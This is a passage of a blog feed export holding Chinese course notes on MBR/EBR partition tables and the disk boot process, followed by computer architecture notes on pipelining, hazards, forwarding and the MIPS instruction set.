<h2 id="主引导扇区第一个扇区"><a class="markdownIt-Anchor" href="#主引导扇区第一个扇区"></a> 主引导扇区（第一个扇区）</h2>
<h3 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h3>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508163959563.png" alt="image-20210508163959563" /></p>
<h3 id="找到分区入口"><a class="markdownIt-Anchor" href="#找到分区入口"></a> 找到分区入口</h3>
<h4 id="分区表项的内容"><a class="markdownIt-Anchor" href="#分区表项的内容"></a> 分区表项的内容</h4>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508164230521.png" alt="image-20210508164230521" /></p>
<h4 id="相对扇区数"><a class="markdownIt-Anchor" href="#相对扇区数"></a> 相对扇区数</h4>
<p>相对于引导记录头部的偏移扇区数</p>
<h4 id="mbr和ebr"><a class="markdownIt-Anchor" href="#mbr和ebr"></a> MBR和EBR</h4>
<p>主分区表中的四个分区表项，属于MBR</p>
<p>扩展分区的分区表项，属于EBR（Extended MBR）</p>
<blockquote>
<p>EBR为了兼容MBR，完全复用了MBR的引导扇区格式，但前466个字节为0，后两个分区表项无效，结束标识55AA</p>
<p>主分区表中最后一个有效主分区记录指向的磁盘空间**（主扩展分区）**将用EBR划分，分为N个逻辑盘，形成EBR链</p>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508165341507.png" alt="image-20210508165341507" /></p>
</blockquote>
<h3 id="整个图示"><a class="markdownIt-Anchor" href="#整个图示"></a> 整个图示</h3>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508165548520.png" alt="image-20210508165548520" /></p>
<h3 id="定位主分区和扩展分区的关键区别"><a class="markdownIt-Anchor" href="#定位主分区和扩展分区的关键区别"></a> 定位主分区和扩展分区的关键区别</h3>
<p>主分区：</p>
<ol>
<li>偏移量是相对物理盘开始（MBR）的偏移，根据偏移得到的就是该分区的引导扇区和文件系统</li>
</ol>
<p>扩展分区：</p>
<ol>
<li>偏移量是相对于包含该分区的扩展分区开始处（EBR）而言</li>
</ol>
<p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508170556297.png" alt="image-20210508170556297" /></p>
<h2 id="硬盘引导过程"><a class="markdownIt-Anchor" href="#硬盘引导过程"></a> 硬盘引导过程</h2>
<ol>
<li>
<p><strong>开机加电自检</strong></p>
<blockquote>
<p>开机，CPU跳到FFFF：0000处，由该处的一条JMP指令跳到BIOS的自检程序（POST），自检通过后，加载引导程序（与操作系统无关的MBR，按用户在BIOS中指定顺序，硬盘，软盘，光驱或U盘等）</p>
</blockquote>
</li>
<li>
<p><strong>读主引导扇区</strong></p>
<blockquote>
<p>将主引导扇区MBR读入到内存的0000：7C00，扫描主分区表，搜索激活分区，分区表项第一个字节为0x80表示激活分区</p>
</blockquote>
</li>
<li>
<p><strong>读激活分区引导扇区</strong></p>
<blockquote>
<p>如果有多个激活分区或没有，报错结束。否则读取激活分区引导扇区到0000：7C00</p>
</blockquote>
</li>
<li>
<p><strong>操作系统引导代码引导系统并读取操作系统初始化文件</strong></p>
</li>
</ol>
<h3 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h3>
<ol>
<li>MBR中硬盘数据结构与操作系统无关</li>
<li>操作系统相关的引导代码在激活分区的引导扇区，而MBR的引导程序选择激活分区</li>
<li>以上步骤采用的是标准MBR，但硬盘也可以引导多系统，要引导多系统必须用专门的引导程序替换标准MBR，这样替换后的硬盘引导代码执行时可让用户选择启动哪个硬盘分区</li>
</ol>
<h3 id="x86实模式寻址"><a class="markdownIt-Anchor" href="#x86实模式寻址"></a> X86实模式寻址</h3>
<ol>
<li>一个段64k，2字节表示</li>
<li>段地址：段内偏移     例如：0001：1234</li>
<li>省略段地址 相对DS数据段寄存器</li>
<li>为了方便，CS（指令段）、DS（数据段）、ES（附加段）、SS（栈段）设定为相同段</li>
<li>指令获取 CS：IP、栈操作 SS：SP</li>
<li>涉及内存的操作指令中没有段信息用DS</li>
</ol>
<h2 id="硬盘逻辑锁"><a class="markdownIt-Anchor" href="#硬盘逻辑锁"></a> 硬盘逻辑锁</h2>
<p>最后一个分区表项又指向了新的MBR形成一个死锁</p>
<h3 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h3>
<ol>
<li>如何遍历FAT表获得一个文件所占的簇？</li>
<li>对于一个多层嵌套的文件，如何找到文件所对应的目录项？</li>
<li>如何找到硬盘的主分区和扩展分区？</li>
<li>简述硬盘引导的过程？</li>
</ol>
]]></content>
      <categories>
        <category>病毒</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>系统结构第三章_流水线</title>
    <url>/archives/ef24c61a.html</url>
    <content><![CDATA[<h2 id="流水线的基本概念"><a class="markdownIt-Anchor" href="#流水线的基本概念"></a> 流水线的基本概念</h2>
<h3 id="1-什么是流水线"><a class="markdownIt-Anchor" href="#1-什么是流水线"></a> 1. 什么是流水线</h3>
<p>定义：流水线是利用执行指令操作之间的并行性，实现多条指令重叠执行的技术</p>
<h4 id="11-术语"><a class="markdownIt-Anchor" href="#11-术语"></a> 1.1 术语</h4>
<p>流水段（流水级）：完成一条指令的一部分操作</p>
<p>机器周期（流水线周期）：指令沿流水线移动一个流水段的时间。长度取决于最慢的流水段，一般是一个时钟周期（有时是两个时钟周期）。每个流水线周期从指令流水线流出一条指令</p>
<p>吞吐量：单位时间从流水线流出的指令数</p>
<span id="more"></span>
<p>流水线设计者：平衡每个流水段的时间，使之等长。因此，每条指令在流水线的平均执行时间在理想情况下为：非流水线机器平均指令执行时间/流水线机器段数</p>
<p>流水线加速比：非流水线机器平均指令执行时间/流水线机器平均指令执行时间</p>
<p>理想情况：流水线加速比=流水线机器段数</p>
<h4 id="12-特点"><a class="markdownIt-Anchor" href="#12-特点"></a> 1.2 特点</h4>
<ol>
<li>类似自动装配线</li>
<li>有多个段（级），段间有<strong>流水线寄存器</strong></li>
<li>每个流水段执行指令或操作的<strong>不同部分</strong></li>
<li>流水段之间采用<strong>同步时钟控制</strong></li>
<li>流水线是开发串行指令流中<strong>并行性</strong>的一种实现技术</li>
</ol>
<h3 id="2-risc指令系统的特点"><a class="markdownIt-Anchor" href="#2-risc指令系统的特点"></a> 2. RISC指令系统的特点</h3>
<ol>
<li>所有参加运算的数据来自<strong>寄存器</strong>，结果也写入<strong>寄存器</strong>，寄存器为32/64位</li>
<li>访存只有<code>load</code>和<code>store</code>指令</li>
<li>指令的类型较少，所有指令<strong>长度相同</strong></li>
<li>不同指令执行的时钟周期数差别不大</li>
</ol>
<h3 id="3-非流水线方式下risc指令系统的实现"><a class="markdownIt-Anchor" href="#3-非流水线方式下risc指令系统的实现"></a> 3. 非流水线方式下RISC指令系统的实现</h3>
<h4 id="31-多周期cpu实现"><a class="markdownIt-Anchor" href="#31-多周期cpu实现"></a> 3.1 多周期CPU实现</h4>
<p>假定指令系统是MIPS的一个定点子集：load/store指令，ALU指令，转移指令</p>
<p>一条指令的执行过程最多需要5个时钟周期：CPI=5</p>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504195556778.png" alt="image-20210504195556778" /></p>
<p>电路图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504195639490.png" alt="image-20210504195639490" /></p>
<p>上图分析：</p>
<ol>
<li>
<p>IF：Instruction fetch cycle</p>
<blockquote>
<ol>
<li>按照PC内容访问指令存储器，取出指令</li>
<li>PC+4→NPC，以获取下一条指令地址</li>
</ol>
</blockquote>
</li>
<li>
<p>ID：Instruction decode/register fetch cycle</p>
<blockquote>
<ol>
<li>指令译码</li>
<li>读寄存器</li>
<li>如果需要，则符号扩展指令中的位移量</li>
</ol>
</blockquote>
</li>
<li>
<p>EX：Execution（执行）/effective address cycle</p>
<blockquote>
<ul>
<li>Load/Store：计算数据存储器有效地址</li>
<li>R-R/R-I ALU：执行运算操作</li>
<li>Branch：做“=0？”测试，并置条件，计算目标地址</li>
</ul>
</blockquote>
</li>
<li>
<p>MEM：Memory access</p>
<blockquote>
<ul>
<li>Load：送有效地址到数据存储器，取数据</li>
<li>Store：写ID，读出数据到有效地址单元中</li>
<li>Branch：如果条件满足计算目标地址送PC；否则NPC送PC</li>
</ul>
</blockquote>
</li>
<li>
<p>WB：Write-back cycle</p>
<blockquote>
<ul>
<li>Load or ALU：写结果到寄存器堆</li>
</ul>
</blockquote>
</li>
</ol>
<h4 id="32-多周期实现的改进"><a class="markdownIt-Anchor" href="#32-多周期实现的改进"></a> 3.2 多周期实现的改进</h4>
<ol>
<li>对于Branch，将“=0？”测试和计算可能的转移目标地址提前到ID</li>
<li>完成ALU指令在MEM cycle</li>
</ol>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504201717892.png" alt="image-20210504201717892" /></p>
<ol start="3">
<li>
<p>改进硬件冗余</p>
<blockquote>
<ol>
<li>ALU可以共享</li>
<li>数据和指令存储器可以合并</li>
</ol>
</blockquote>
</li>
</ol>
<h3 id="4-经典5段流水线risc处理器"><a class="markdownIt-Anchor" href="#4-经典5段流水线risc处理器"></a> 4. 经典5段流水线RISC处理器</h3>
<h4 id="41-特点"><a class="markdownIt-Anchor" href="#41-特点"></a> 4.1 特点</h4>
<ol>
<li>5个段构成一个指令流水线，一条指令经过每个段</li>
<li>CPI减小到1，因为平均每个时钟周期发射或完成一条指令</li>
<li>在任意时钟周期，在每个流水段正执行一条指令的部分</li>
<li>理想情况下，性能提升5倍</li>
</ol>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504202456375.png" alt="image-20210504202456375" /></p>
<h4 id="42-实现"><a class="markdownIt-Anchor" href="#42-实现"></a> 4.2 实现</h4>
<p>为了实现，在每两段之间新增流水线寄存器，其作用：</p>
<ol>
<li>在本周期提供流水段中指令操作的数据及控制信息</li>
<li>周期结束时，存指令操作结果供下一个流水段指令使用</li>
</ol>
<p>如下图蓝色部分：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203103762.png" alt="image-20210504203103762" /></p>
<h4 id="43-对比"><a class="markdownIt-Anchor" href="#43-对比"></a> 4.3 对比</h4>
<ol>
<li>
<p>对比单周期实现，流水线减少了时钟周期长度</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203333003.png" alt="image-20210504203333003" /></p>
</li>
<li>
<p>对比多周期实现，流水线减少了CPI</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203357254.png" alt="image-20210504203357254" /></p>
</li>
</ol>
<h4 id="44-问题"><a class="markdownIt-Anchor" href="#44-问题"></a> 4.4 问题</h4>
<h5 id="441-存储器访问冲突"><a class="markdownIt-Anchor" href="#441-存储器访问冲突"></a> 4.4.1 存储器访问冲突</h5>
<p>结构冒险（structure hazard）：在同一时钟周期不同操作使用同一数据通路资源</p>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203832540.png" alt="image-20210504203832540" /></p>
<p>解决：使用分开的指令cache和数据cache</p>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504204140731.png" alt="image-20210504204140731" /></p>
<p>注意：如果时钟周期不变，流水线存储系统的带宽<strong>必须是非流水线的5倍</strong></p>
<h5 id="442-寄存器冲突"><a class="markdownIt-Anchor" href="#442-寄存器冲突"></a> 4.4.2 寄存器冲突</h5>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504204333445.png" alt="image-20210504204333445" /></p>
<p>解决：重新设计寄存器堆资源</p>
<ol>
<li>
<p>允许在一个时钟周期WB段先写，ID段后读</p>
<blockquote>
<p>每个时钟周期完成2个读和一个写</p>
<p>需要提供两个读端口和一个写端口</p>
<p>当写和读同一个寄存器会发生数据冒险（Data hazard）</p>
</blockquote>
</li>
</ol>
<h5 id="443-更新pc时冲突"><a class="markdownIt-Anchor" href="#443-更新pc时冲突"></a> 4.4.3 更新PC时冲突</h5>
<p>每个时钟周期必须增量PC并存储到PC</p>
<p>遇到转移指令时可能会改变PC的值，可能会产生控制冒险（Control hazard）</p>
<h3 id="5-流水线的基本性能"><a class="markdownIt-Anchor" href="#5-流水线的基本性能"></a> 5. 流水线的基本性能</h3>
<ol>
<li>增大了吞吐量（单位时间完成指令条数）</li>
<li>每一条指令的执行时间没有加快</li>
<li>延迟：附加的控制增加了开销</li>
<li>不平衡：流水线各段时间以最慢的为准</li>
<li>附加开销：流水线寄存器</li>
<li>流水线冒险：串行机器不会产生冒险</li>
<li>填充和排空：会减小加速比</li>
</ol>
<h2 id="流水线的主要障碍-流水线冒险相关"><a class="markdownIt-Anchor" href="#流水线的主要障碍-流水线冒险相关"></a> 流水线的主要障碍-流水线冒险（相关）</h2>
<h3 id="1-冒险分类与有停顿流水线性能"><a class="markdownIt-Anchor" href="#1-冒险分类与有停顿流水线性能"></a> 1. 冒险分类与有停顿流水线性能</h3>
<h4 id="11-冒险分类"><a class="markdownIt-Anchor" href="#11-冒险分类"></a> 1.1 冒险分类：</h4>
<ol>
<li>结构冒险：指令重叠执行时，发生硬件资源冲突</li>
<li>数据冒险：几条指令重叠执行时，后面指令依赖前面指令的结果却没有准备好（没有计算或存储）</li>
<li>控制冒险：发生在流水线执行转移指令时，在进入ID段时，转移条件和转移目标地址不能按时提供给IF段取下一条指令</li>
</ol>
<p>冒险出现时：避免流水线上有冒险的指令执行下一个流水段</p>
<p>冒险总是可以用停顿（流水线气泡/气泡）解决：停顿时，其后的所有指令被停顿，指令之前的指令继续执行，没有新的指令被取到流水线</p>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504211313154.png" alt="image-20210504211313154" /></p>
<h4 id="12-有停顿的流水线性能"><a class="markdownIt-Anchor" href="#12-有停顿的流水线性能"></a> 1.2 有停顿的流水线性能</h4>
<p>加速比公式：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504211507892.png" alt="image-20210504211507892" /></p>
<p>流水线CPI=理想CPI（≈1）+平均每条指令的停顿周期数</p>
<p>忽略流水线时钟周期的额外开销，并假设流水段是平衡的，则：非流水线时钟周期=流水线时钟周期</p>
<p>最终得：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504212021602.png" alt="image-20210504212021602" /></p>
<h3 id="2-结构冒险流水段竞争"><a class="markdownIt-Anchor" href="#2-结构冒险流水段竞争"></a> 2. 结构冒险：流水段竞争</h3>
<h4 id="21-定义"><a class="markdownIt-Anchor" href="#21-定义"></a> 2.1 定义</h4>
<p>发生在同一时钟周期，2条或多条指令想要使用同一硬件资源</p>
<h4 id="22-出现情况"><a class="markdownIt-Anchor" href="#22-出现情况"></a> 2.2 出现情况</h4>
<ol>
<li>多重访问寄存器堆</li>
<li>多重访问存储器</li>
<li>没有或没有充分流水功能部件</li>
</ol>
<h4 id="23-解决"><a class="markdownIt-Anchor" href="#23-解决"></a> 2.3 解决</h4>
<ol>
<li>
<p>寄存器堆的多重访问</p>
<blockquote>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213234617.png" alt="image-20210504213234617" /></p>
<p>方法1.：简单插入一个停顿，将降低加速比</p>
<p>方法2：在一个时钟周期WB段先写，ID段后读</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213429124.png" alt="image-20210504213429124" /></p>
</blockquote>
</li>
<li>
<p>多重访问单端口存储器</p>
<blockquote>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213646077.png" alt="image-20210504213646077" /></p>
<p>方法1：插入停顿</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213806538.png" alt="image-20210504213806538" /></p>
<p>方法2：提供另一个存储器端口</p>
<p>方法3：分开指令存储器和数据存储器</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213843051.png" alt="image-20210504213843051" /></p>
<p>方法4：使用指令缓冲器</p>
</blockquote>
</li>
<li>
<p>没有完全流水化的功能部件</p>
<blockquote>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504214056065.png" alt="image-20210504214056065" /></p>
</blockquote>
</li>
</ol>
<h4 id="24-认识"><a class="markdownIt-Anchor" href="#24-认识"></a> 2.4 认识</h4>
<p>结构冒险是被允许的，为了<strong>减少成本、减少部件延迟</strong></p>
<h3 id="3-数据冒险"><a class="markdownIt-Anchor" href="#3-数据冒险"></a> 3. 数据冒险</h3>
<h4 id="31-定义"><a class="markdownIt-Anchor" href="#31-定义"></a> 3.1 定义</h4>
<p>由于流水线上指令重叠执行，改变了原来串行执行的读/写操作数顺序，使得后面依赖前面指令结果的指令得不到准备好的数据</p>
<h4 id="32-解决"><a class="markdownIt-Anchor" href="#32-解决"></a> 3.2 解决</h4>
<p>不要让指令在数据冒险时重叠执行</p>
<h4 id="33-实施"><a class="markdownIt-Anchor" href="#33-实施"></a> 3.3 实施</h4>
<p>流水线停顿</p>
<p>软件：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505153243028.png" alt="image-20210505153243028" /></p>
<p>硬件：</p>
<blockquote>
<p>增加硬件互锁（Interlock）</p>
<blockquote>
<p>增加额外硬件检测需要停顿的情况</p>
<p>增加额外硬件放“气泡”（暂停）到流水线</p>
</blockquote>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505153751740.png" alt="image-20210505153751740" /></p>
</blockquote>
<h4 id="34-forwarding前推-直通-转发-相关数据通路"><a class="markdownIt-Anchor" href="#34-forwarding前推-直通-转发-相关数据通路"></a> 3.4 Forwarding（前推、直通、转发、相关数据通路）</h4>
<p>有数据冒险指令需要的结果可能已经计算出来，存放在流水线寄存器中，所以我们可以在数据通路中增加数据线（buses）传送这些结果，这些buses总是从后面的流水段连接到前面的流水段</p>
<p>图示：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505154733078.png" alt="image-20210505154733078" /></p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155325030.png" alt="image-20210505155325030" /></p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155531924.png" alt="image-20210505155531924" /></p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155617247.png" alt="image-20210505155617247" /></p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155645091.png" alt="image-20210505155645091" /></p>
<p>没有Forwarding和有Forwarding的比较：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155812070.png" alt="image-20210505155812070" /></p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155823248.png" alt="image-20210505155823248" /></p>
]]></content>
      <categories>
        <category>系统结构</category>
      </categories>
      <tags>
        <tag>课程</tag>
        <tag>计算机</tag>
        <tag>系统结构</tag>
      </tags>
  </entry>
  <entry>
    <title>系统结构第二章_指令系统原理与实例</title>
    <url>/archives/a6c351d5.html</url>
    <content><![CDATA[<h2 id="1-指令集系统结构的分类"><a class="markdownIt-Anchor" href="#1-指令集系统结构的分类"></a> 1. 指令集系统结构的分类</h2>
<p>根本区别：处理器内部数据的存储结构不同</p>
<p>存储结构：</p>
<ol>
<li>堆栈：操作数隐含的位于栈顶</li>
<li>累加器：一个隐含操作数就是累加器</li>
<li>通用寄存器：明确地指定操作数，不是寄存器就是存储器地址
<ol>
<li>register-memory系统结构：一般指令都可以访存</li>
<li>register-register/load-store系统结构：只有load、store指令能访存</li>
</ol>
</li>
</ol>
<span id="more"></span>
<p>图示：</p>
<p>数据流动示意图：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502145943075.png" alt="image-20210502145943075" /></p>
<p>运算例子示意图：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502150225975.png" alt="image-20210502150225975" /></p>
<p>通用寄存器ISA运算类指令的两个特性：</p>
<ol>
<li>ALU指令中包括两个或三个操作数</li>
<li>ALU指令中包括0到3个存储器操作数</li>
</ol>
<p>通用寄存器计算机优缺点：</p>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502151144878.png" alt="image-20210502151144878" /></p>
<h2 id="2-存储器寻址"><a class="markdownIt-Anchor" href="#2-存储器寻址"></a> 2. 存储器寻址</h2>
<h3 id="21-寻址方式"><a class="markdownIt-Anchor" href="#21-寻址方式"></a> 2.1 寻址方式</h3>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502152010830.png" alt="image-20210502152010830" /></p>
<h3 id="22-小结"><a class="markdownIt-Anchor" href="#22-小结"></a> 2.2 小结</h3>
<ol>
<li>一般ISA支持的基本寻址方式：立即数寻址、位移量寻址、寄存器间接寻址</li>
<li>位移量为13-16位、立即数为16位</li>
<li>立即数寻址通常用于：运算类指令、置常数到寄存器指令</li>
</ol>
<h2 id="3-mips系统结构"><a class="markdownIt-Anchor" href="#3-mips系统结构"></a> 3. MIPS系统结构</h2>
<p>特点：</p>
<ol>
<li>一种简单64位load-store系统结构</li>
<li>固定长度指令编码</li>
</ol>
<p>寄存器：</p>
<ol>
<li>32个64位通用寄存器（GPR），R0……R31，<strong>R0永远是0</strong></li>
<li>32个浮点寄存器（FPR），F0……F31，可作为32位单精度寄存器使用，也可作为64位双精度寄存器使用</li>
</ol>
<p>寻址方式：</p>
<ol>
<li>16位立即数寻址</li>
<li>16位基址寻址，当位移量为0时是寄存器间接寻址、当R0作为基址寄存器时是16位绝对寻址</li>
</ol>
<p>指令格式：</p>
<ol>
<li>指令长度：32位，6位为基本操作码</li>
<li>两种存储器寻址方式：编码到操作码中</li>
</ol>
<p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503153254772.png" alt="image-20210503153254772" /></p>
<p>操作：</p>
<ol>
<li>载入和存储
<ul>
<li>所有通用寄存器和浮点数寄存器都可以被载入或存储，除了R0</li>
<li><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503153545936.png" alt="image-20210503153545936" /></li>
<li>上述图示说明：
<ol>
<li>⬅的下标表示传送n位</li>
<li>Mem表示主存，按字节编址</li>
<li>下标标识字段中特定的位，从以0开始的最高位开始标注</li>
<li>上标表示对字段的复制</li>
<li>##表示字段的连接</li>
</ol>
</li>
</ul>
</li>
<li>ALU操作
<ul>
<li>都是寄存器-寄存器指令</li>
<li>包括算术和逻辑操作：加、减、与、或、异或、移位</li>
<li><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503154351355.png" alt="image-20210503154351355" /></li>
</ul>
</li>
<li>分支和跳转
<ul>
<li><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503154602183.png" alt="image-20210503154602183" /></li>
</ul>
</li>
<li>浮点操作
<ul>
<li>浮点指令指出操作数是单精度（SP）还是双精度（DP）</li>
<li>MOV.S和MOV.D分别复制单精度和双精度的寄存器</li>
<li>MFC1、MTC1、DMFC1、DMTC1在一个单精度或双精度浮点数寄存器和一个定点寄存器之间传送数据</li>
</ul>
</li>
</ol>
<h2 id="4-一些误区"><a class="markdownIt-Anchor" href="#4-一些误区"></a> 4. 一些误区</h2>
<ol>
<li>专门设计支持高级语言结构的“高级”指令功能</li>
<li>存在一种典型的程序</li>
<li>可以不考虑编译器而改进指令系统以缩减代码大小</li>
